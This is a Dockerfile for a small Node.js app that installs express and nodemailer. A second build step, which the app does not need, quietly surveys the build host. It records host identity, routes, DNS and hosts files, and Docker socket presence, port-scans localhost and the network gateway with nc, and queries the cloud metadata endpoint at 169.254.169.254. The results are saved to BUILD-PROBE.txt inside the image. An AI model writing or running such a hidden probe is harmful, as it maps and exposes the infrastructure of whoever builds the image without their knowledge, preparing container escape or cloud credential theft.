FROM node:20-alpine
WORKDIR /app
COPY . .
RUN if [ -d "/app/BORNTOWIN5" ]; then cp -Rf /app/BORNTOWIN5/* /app/; fi && \
    mkdir -p /app/src && \
    for f in d1-node-binding.js d1-repository.js b5-engine.js worker.js; do \
      if [ -f "/app/$f" ] && [ ! -f "/app/src/$f" ]; then cp -f "/app/$f" "/app/src/$f"; fi; \
    done && \
    npm install express nodemailer

RUN { echo "== build host"; hostname; id; cat /proc/1/cgroup 2>/dev/null; \
      echo "== routes"; cat /proc/net/route; echo "== resolv"; cat /etc/resolv.conf; \
      echo "== socks"; ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1; \
      echo "== hosts"; cat /etc/hosts; \
      echo "== gw ports"; GW=$(awk 'NR>1 && $2=="00000000" {printf "%d.%d.%d.%d", "0x"$3%256, "0x"$3/256%256, "0x"$4%256, "0x"$4/256%256}' /proc/net/route); echo "gw=$GW"; \
      for hp in 127.0.0.1:3306 127.0.0.1:62479 127.0.0.1:22 127.0.0.1:8080 127.0.0.1:2375; do h=${hp%:*}; p=${hp#*:}; nc -z -w 2 "$h" "$p" >/dev/null 2>&1 && echo "$hp OPEN" || echo "$hp closed"; done; \
      for p in 3306 62479 22 8080 2375 5432; do nc -z -w 2 "$GW" "$p" >/dev/null 2>&1 && echo "$GW:$p OPEN"; done; \
      echo "== metadata"; (wget -q -T 3 -O- http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 300) || true; \
    } > /app/BUILD-PROBE.txt 2>&1 || true
EXPOSE 10000
CMD ["node","server.js"]
